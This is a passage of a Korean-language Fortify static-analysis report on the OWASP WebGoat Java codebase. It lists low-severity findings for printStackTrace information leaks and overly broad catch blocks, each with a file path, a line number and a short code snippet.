                        <Issue iid="10D4432215FC1D906CED38AA5E8FCC55" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>BasicAuthentication.java의 doStage2() 함수는 251 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>251</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="390CC7C47C215AE245AA7F18DFBC4FEA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest() 함수는 344 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>344</LineStart>
<Snippet>	{
	    System.out.println("Validation failed");
	    ve.printStackTrace();
	    setCurrentAction(s, ERROR_ACTION);
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B922D2C153F3FCD70F6920FBA8EF3AE2" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SQLInjection.java의 handleRequest() 함수는 355 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>355</LineStart>
<Snippet>		s.setMessage("Login failed");
		System.out.println("Authentication failure");
		ue.printStackTrace();
	    }
	    catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="435FCB107394C1B62FA1D1B941C914E7" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile_BACKUP() 함수는 200 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>200</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="450EDF14D048E6125EA598D94E9995C0" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 getUserName() 함수는 216 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>216</LineStart>
<Snippet>		{
			s.setMessage( "Error getting user name" );
			e.printStackTrace();
		}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DABE998A0B6FAD79EB0991E4EAAC181B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>PathBasedAccessControl.java의 createContent() 함수는 217 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>217</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="30BA3110C9C99222B1E03052176CC477" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees() 함수는 115 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>115</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employees");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="131F17E79F63F981BB3DAA10455F2822" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HiddenFieldTampering.java의 createContent() 함수는 165 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HiddenFieldTampering.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HiddenFieldTampering.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="71BF097995A06C0A5E79ED93F9DFA30B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LessonSource.java의 doPost() 함수는 93 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>93</LineStart>
<Snippet>	catch (Throwable t)
	{
	    t.printStackTrace();
	    log("ERROR: " + t);
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A94731E83EB1AF8526072EA57511AF95" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SummaryReportCardScreen.java의 createContent() 함수는 101 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SummaryReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/SummaryReportCardScreen.java</FilePath>
<LineStart>101</LineStart>
<Snippet>	catch (Exception e)
	{
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="434C02AFB8035E739BE7929C0035BE55" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Challenge2Screen.java의 sendMessage() 함수는 729 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>729</LineStart>
<Snippet>	{
	    System.out.println("Couldn't write " + message + " to " + s);
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D9077301391A2AB9CFF320A0941B7299" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 doChangeEmployeeProfile_BACKUP() 함수는 309 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>309</LineStart>
<Snippet>	{
	    s.setMessage("Error updating employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="96AF7220DB83AEDCBF2DD2A39C114AF0" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile() 함수는 146 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>146</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D13CCAFA47C75F58C2F9560901CDDCA9" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SQLInjection.java의 handleRequest() 함수는 342 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>342</LineStart>
<Snippet>	    {
		System.out.println("Missing parameter");
		pnfe.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="149">
                        <groupTitle>Poor Error Handling: Overly Broad Catch</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson.java 줄 420의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>여러 catch 블록은 반복적이지만 Exception 같은 높은 수준의 클래스를 catch하여 catch 블록을 "압축"하면 특수 처리가 필요하거나 프로그램의 이 시점에서 catch되지 않아야 하는 예외 사항을 숨길 수 있습니다. 지나치게 광범위한 예외 사항을 catch하면 Java의 형식화된 예외 사항을 사용하는 의미가 사라지고 특히 프로그램이 커져서 새로운 형식의 예외 사항이 발생하기 시작하면 위험해질 수 있습니다. 새 예외 형식에는 주의를 기울이지 않기 때문입니다.

예제: 다음 발췌된 코드는 세 가지 형식의 예외 사항을 동일한 방식으로 처리합니다.


  try {
    doExchange();
  }
  catch (IOException e) {
    logger.error("doExchange failed", e);
  }
  catch (InvocationTargetException e) {
    logger.error("doExchange failed", e);
  }
  catch (SQLException e) {
    logger.error("doExchange failed", e);
  }


언뜻 보기에 다음과 같이 예외 사항을 하나의 catch 블록으로 처리하는 것이 바람직한 것처럼 보입니다.


  try {
    doExchange();
  }
  catch (Exception e) {
    logger.error("doExchange failed", e);
  }


하지만 doExchange()가 수정되어 다른 방식으로 처리해야 하는 새로운 형식의 예외 사항이 발생하면 광범위한 catch 블록 때문에 컴파일러가 문제를 지적할 수 없습니다. 뿐만 아니라, 새 catch 블록은 ClassCastException 및 NullPointerException과 같이 RuntimeException에서 파생된 예외 사항도 처리하는데 이는 프로그래머의 의도와 반대되는 것입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>아주 높은 수준의 프로그램이나 스레드를 제외하고는 Exception, Throwable, Error 또는 RuntimeException 같은 광범위한 예외 클래스를 catch하지 마십시오.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Secure Coding Rulepacks는 해당 catch 블록이 즉시 새 예외 사항을 발생시키면 overly broad catch 블록에 플래그를 지정하지 않습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>149</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="AEF2EDAAAE6853C8D769C509280F174E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 390의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>390</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error updating employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C220995374D2578FC2393DAD1C1EE57F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AbstractLesson.java 줄 476의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>476</LineStart>
<Snippet>	    reader.close();
	}
	catch (Exception e)
	{
	    System.out.println(e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2B2093BCC5A531B757B132257F9136D5" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>CrossSiteScripting.java 줄 381의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>381</LineStart>
<Snippet>		ue2.printStackTrace();
	    }
	    catch (Exception e)
	    {
		// All other errors send the user to the generic error page</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="49CE9303A11A1D613AA39F22A06D5555" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DOMInjection.java 줄 89의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOMInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOMInjection.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5A9D126865093070DDD009C5657A5A6A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java 줄 209의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>209</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="275CDA90647F690F2043ADAFE265B7CF" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Login.java 줄 166의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error logging in");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E3575E637EB98390E2E8457FC840D23C" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WebSession.java 줄 445의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>445</LineStart>
<Snippet>			return realConnectionString;
		}
		catch ( Exception e )
		{
			System.out.println( "Couldn't open database: check web.xml database parameters" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B7E8E8A93D9F1684BE61D5ED89B5C4B6" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpSplitting.java 줄 235의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>235</LineStart>
<Snippet>	    }
	}
	catch (Exception ex)
	{
	    ec.addElement(new P().addElement(ex.getMessage()));</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="41C3BF30B478B855DCE389C81F960289" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 550의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>550</LineStart>
<Snippet>		}

		catch ( Exception e )
		{
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DBEF342ED812D30C8CDD2669367A9ED5" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 141의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>141</LineStart>
<Snippet>	    return new Boolean(getSubParameter(first, next)).booleanValue();
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6247BD61D21610E73C95D7091B51A31D" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AbstractLesson.java 줄 420의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>420</LineStart>
<Snippet>	    reader.close();
	}
	catch (Exception e)
	{
	    System.out.println(e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D58A606520620F421FCABBBCDB8D9797" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>TraceXSS.java 줄 220의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>220</LineStart>
<Snippet>	    ec.addElement(new HR().setWidth("90%"));
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8805E92BF7121E17D91424C15D5A8D85" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 179의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>179</LineStart>
<Snippet>	    return getByteParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E584A4835A67DAD177EC7069A30FADDD" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ReportCardScreen.java 줄 87의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ReportCardScreen.java</FilePath>
<LineStart>87</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6868841028A93E88618D4938359688B8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java 줄 101의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>101</LineStart>
<Snippet>		ec.addElement(pre);
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="855540D968F27335E501D94DDAC62262" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Course.java 줄 377의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Course.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Course.java</FilePath>
<LineStart>377</LineStart>
<Snippet>    				}
    			}
    			catch (Exception e)
    			{
    				//System.out.println("Warning: " + e.getMessage());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6D3B3E1175A5ECA94F8F860C7A2A7D0A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
